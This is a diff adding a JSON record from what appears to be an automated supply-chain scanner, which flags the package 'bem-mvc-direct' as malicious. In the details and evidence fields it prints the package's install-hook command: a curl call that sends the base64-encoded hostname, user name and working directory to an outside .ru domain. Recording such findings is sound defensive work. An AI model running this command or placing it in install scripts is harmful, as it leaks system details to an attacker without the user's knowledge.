@@ -1,0 +1,33 @@
+{
+  "package_name": "bem-mvc-direct",
+  "version": "1.11.3",
+  "label": "malicious",
+  "behaviors": [
+    {
+      "category": "install_hook",
+      "summary": "The package contains an install hook present at install time that executes commands listed in the package metadata.",
+      "details": "The install hook is present in the package and is executed at install time. The commands listed in the package metadata are curl -H\"Package: bem-mvc-direct\" -H\"Version: 1.11.3\" -H\"Hostname: $(hostname|base64)\" -H\"Whoami: $(whoami|base64)\" -H\"Pwd: $(pwd|base64)\" -d\"meow!securitytest\" http://npm_new.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru",
+      "confidence": 0.72,
+      "evidence_apis": [],
+      "evidence_files": [],
+      "evidence_domains": [],
+      "evidence_commands": [
+        "curl -H\"Package: bem-mvc-direct\" -H\"Version: 1.11.3\" -H\"Hostname: $(hostname|base64)\" -H\"Whoami: $(whoami|base64)\" -H\"Pwd: $(pwd|base64)\" -d\"meow!securitytest\" http://npm_new.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"
+      ],
+      "evidence_env_vars": []
+    }
+  ],
+  "risk_vector": [
+    "install_hook"
+  ],
+  "analyst_note": "",
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "semantic_v2.0",
+    "routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-26T22:02:37.967135"
+}
